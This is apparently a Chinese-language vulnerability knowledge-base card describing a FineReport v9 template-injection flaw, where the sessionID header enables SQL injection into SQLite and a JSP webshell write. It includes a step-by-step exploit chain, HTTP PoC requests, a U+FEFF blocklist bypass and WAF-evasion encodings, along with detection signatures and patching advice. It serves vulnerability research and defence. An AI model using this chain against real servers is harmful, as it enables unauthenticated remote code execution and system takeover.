---
id: web-java-component-finereport-print-ie-pdf-sqli-webshell
title: FineReport v9 print/ie/pdf 的 sessionID 头进入模板渲染，${sql()} 注入 SQLite 写 JSP WebShell
type: scenario
domain: web
path: web/java/component
technique: finereport-print-ie-pdf-template-sqli-sqlite-file-write
tags:
- java
- finereport
- sqli
- template-injection
- sqlite
- arbitrary-file-write
- webshell
- waf-bypass
- cjk-encoding
cve: []
severity: critical
confidence: high
affected_versions: FineReport <= 11.0.29；FineBI <= 6.0.20、<= 6.1.3（修复：FineReport 11.0.30、FineBI 6.0.21 / 6.1.4）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V34
  verified_at: '2026-11-05T06:06:44+08:00'
  notes: 已对照原文与61张图核对：img41 版本表、img45 sessionID 拼入 TemplateUtils.render、img55-57 randomblob 延时实测、img58-61 SQL 双层检查与 CJK/URL 解码均与卡片一致。未验证点：未在本机复现写 JSP 全链，原文未展示最终 webshell 回显。
url: /docs/web/java/component/web-java-component-finereport-print-ie-pdf-sqli-webshell/
draft: false
kb_aliases:
- FineReport print_ie_pdf SQL 注入
- 帆软 /nx/report/v9/print/ie/pdf RCE
- sessionID 头模板注入
- FineReport SQLite ATTACH 写文件
- FRDemo U+FEFF 绕过
---

## 一句话结论

FineReport v9 的 `/webroot/decision/nx/report/v9/print/ie/pdf` 把请求头 `sessionID` 原样拼进 HTML 并交给 `TemplateUtils.render()` 渲染；攻击者在头里放 `${sql('FRDemo', ...)}`，即可用内置 SQL 函数对默认 SQLite 测试库执行堆叠语句，借 `ATTACH DATABASE ... AS ...` + `CREATE TABLE` + `INSERT` 把 JSP 写入 `webapps/webroot`，再触发 Jasper 解析，未认证获取 WebShell。v10 路由校验 sessionID，只有 v9 该处理链可注入。

## 原理

- 路由 `GET /webroot/decision/nx/report/v9/print/ie/pdf` 映射到 `com.fr.nx.app.web.controller.NXController.pdfPrintForIEV9`，后者调用 `PDFPrintPrintForIEHandler.HANDLER.handle(...)`。
- `PDFPrintPrintForIEHandler.handleRequest` 先调用 `SessionPoolManager.getOrGenerateSessionIDWithCheckRegister(request, response)` 取 `sessionID`，然后拼接：
  ```java
  String var4 = "${servletURL}?op=export&sessionID=" + var3 + "&format=pdf&random=...";
  ...
  var7.print(TemplateUtils.render(var9));
  ```
  `var3` 就是攻击者可控的 sessionID，直接进入 `var9` 的 HTML 字符串，最后被 `TemplateUtils.render` 当模板求值。
- FineReport 模板表达式支持内置函数 `SQL(connectionName, sql, columnIndex, rowIndex)`；`FRDemo` 是产品自带 SQLite 测试库（位于 `/webroot/help`）。因此 `${sql('FRDemo','select ...',1,1)}` 会在服务端执行任意 SQL。
- SQLite 可堆叠执行 `ATTACH DATABASE '<path>' AS <alias>; CREATE TABLE <alias>.<t>(data text); INSERT INTO <alias>.<t> VALUES (x'<hex>');`，把十六进制 JSP 内容写到任意可写路径；目标路径用 `../webapps/webroot/xxx.jsp` 相对 FineReport 工作目录穿越到 Web 根。
- FineReport 对 SQL 有两处检查：`SQL#run → dealWithParameters → EscapeSqlLocalHelper.processEscape.hasForbidWord`（只对含占位符的语句生效，直接语句不触发）和 `JDBCSecurityChecker.checkQuery`（`removeSpecialCharacters` 去掉引号内内容与特殊符号，再按带前后空格的 `" drop "`、`" attach "` 等关键词探测）。关键绕过是 SQLite 在语句首字符为 U+FEFF（URL `%EF%BB%BF`）时会忽略它，而黑名单只匹配前后有空格的 `" attach "`，`﻿ATTACH` 前面没有空格，因而漏检；执行时 U+FEFF 被 SQLite 去掉，语句恢复正常。
- 参数读取统一走 `NetworkHelper.getHTTPRequestEncodeParameter`：先取 header，再依次取 request/attribute/JSON/session；找不到时对参数名做 CJK 编码再找；最后 `checkURLDecode` 做 CJK 解码 + URL 解码。这让 `[24][7B]` 形式的 CJK 编码和 URL 编码都能还原成 `${...}`，可同时绕过 WAF 关键字检测。
- 写入 `.jsp` 后，Tomcat 默认未必已初始化 JSP 引擎；访问 `/webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&type=class` 可触发加载 Jasper 初始化器，使后续请求能编译执行 JSP。

## 触发条件

- FineReport 受影响版本（原文：FineReport <= 11.0.29；FineBI <= 6.0.20、<= 6.1.3）。
- 目标使用默认 `FRDemo` SQLite 测试库（或存在任意可堆叠执行且可 `ATTACH` 的 SQLite 连接）。
- Web 进程对 `webapps/webroot` 有写权限；`.jsp` 可被容器解析。
- v9 路由可达；v10 路由会校验 sessionID，不适用。
- 已知 root 路径/相对路径；默认安装结构下 `../webapps/webroot` 可用。

## 利用步骤

1. 先验证注入：`sessionID` 头传 URL 编码的 `${sql('FRDemo','SELECT hex(randomblob(10000000));',1)}`，观察响应时间随 blob 大小增长（1 → 4ms，100000 → 34ms，10000000 → 167ms），确认 SQL 执行。
2. 构造写文件三段 SQL，分别用三个 `${sql(...)}` 串在同一个 header 里：
   - `ATTACH DATABASE '../webapps/webroot/zddc.jsp' AS jwgeed;`
   - `CREATE TABLE jwgeed.xff(data text);`
   - `INSERT INTO jwgeed.xff(data) VALUES (x'<JSP 十六进制>');`
3. 每段 SQL 用 `DECODE('%EF%BB%BF...')` 包裹：既完成 URL 解码，又让 SQLite 语句以 U+FEFF 开头绕过 `" attach "` 等黑名单。整个 header 可再做 CJK 编码以绕过 WAF。
4. 发送请求后访问 `/webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&type=class` 初始化 Jasper。
5. 访问写入的 `zddc.jsp`，用参数执行命令；JSP 内容可用 Base64 等方式加载更小的命令马。
6. 若 `/decision` 侧被拦截，可尝试 `/webroot/ReportServer` 直达 `ReportDispatcher`（该 servlet 不经过 Spring 拦截器），但本漏洞的 controller 路由需按实际映射确认。

## PoC

延时确认：

```http
GET /webroot/decision/nx/report/v9/print/ie/pdf HTTP/1.1
Host: target:8075
sessionID: %24%7Bsql%28%27FRDemo%27%2C%27SELECT%20hex%28randomblob%2810000000%29%29%3B%27%2C1%29%7D
Accept: */*
```

写 JSP（原文完整 sessionID 为 CJK 编码的 `${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH DATABASE '../webapps/webroot/zddc.jsp' AS jwgeed;'),1,1)}${...CREATE...}${...INSERT...}`，下为其可读形式）：

```text
${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH DATABASE '../webapps/webroot/zddc.jsp' AS jwgeed;'),1,1)}
${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFCREATE TABLE jwgeed.xff(data text);'),1,1)}
${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFINSERT INTO jwgeed.xff(data) VALUES (x'<hex>');'),1,1)}
```

其中 `<hex>` 是 JSP 内容（原文为 `<%@ page import="java.io.*,java.util.Base64" %><%out.print("KFC");String a=request.getParameter("a");...` 的十六进制）。加载解析器：

```http
GET /webroot/decision/file?path=org.apache.jasper.servlet.JasperInitializer&type=class HTTP/1.1
Host: target:8075
```

访问 `http://target:8075/webroot/zddc.jsp?a=<base64命令>` 执行。

## 变体与关联

- 注入点变体：`sessionID` 也可从 request/attribute/JSON/session 取，`getHTTPRequestEncodeParameter` 的多来源合并给参数投递提供多种姿势。
- 绕过变体：CJK 编码 + URL 编码组合可绕过对 `${`、`sql(`、空格、引号的 WAF 规则；`DECODE` 还能二次 URL 解码。
- SQL 变体：若目标不是 SQLite，可用对应数据库的堆叠/文件写原语；`SQL` 函数支持的连接名不限于 `FRDemo`。
- 关联：[[web-java-component-finereport-view-reportserver-template-sqli-webshell]]（同产品 `/view/ReportServer` URL 模板注入，无需 sessionID）；[[web-java-component-finereport-reportserver-hsql-param-rce]]（同产品但走 HSQL `CREATE ALIAS` 的另一条 RCE 链）。
- 关联：[[web-generic-sqli-mysql-outfile-general-log-webshell]]（SQL 堆叠/写文件落 WebShell 的通用形态）、[[web-generic-sqli-mssql-stacked-xp-cmdshell]]（堆叠语句直接命令执行）。

## 检测与防御

- 检测：`/nx/report/v9/print/ie/pdf` 请求头 `sessionID` 含 `${`、`sql(`、`DECODE(`、`ATTACH`、`CREATE TABLE`、`x'` 等特征，或出现 `[24][7B]` 形式 CJK 编码。
- 检测：`fanruan.log` 中出现 `SQL function:`、`ATTACH`、`JDBCSecurityChecker` 异常；`webapps/webroot` 下新增 `.jsp`；进程创建 `java` 子进程/命令执行。
- 防御：升级到 FineReport 11.0.30+ / FineBI 6.0.21+ / 6.1.4+；对 `sessionID` 做格式白名单校验，禁止进入模板渲染。
- 防御：禁止模板渲染外部参数；`SQL` 函数只允许只读查询，禁用堆叠；SQL 检查去掉 U+FEFF 等不可见字符后再匹配。
- 加固：删除/隔离 `FRDemo` 测试库；Web 目录禁止写入；部署官方安全插件并确保其启用；WAF 对 CJK/URL 多层解码后再检测。
